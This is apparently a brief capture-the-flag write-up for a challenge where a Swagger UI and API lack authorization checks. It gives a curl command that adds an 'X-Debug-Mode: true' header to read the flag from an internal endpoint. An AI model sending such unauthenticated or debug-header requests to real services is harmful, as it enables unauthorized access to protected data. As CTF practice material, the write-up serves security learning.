# Vulnerability

Missing API authorization: The Swagger UI and API endpoints are publicly accessible without proper authorization checks.

# Extraction

In swagger page with calling this API `https://ctf.seoeh.ir/api/internal/flag` with `-H 'X-Debug-Mode: true'` we will get the flag in this format:
```
{
  "flag": FLAG
}
```

# PoC

```
curl -s -X 'GET' \
  'https://ctf.seoeh.ir/api/internal/flag' \
  -H 'accept: application/json' \
  -H 'X-Debug-Mode: true' | jq -r '.flag'
```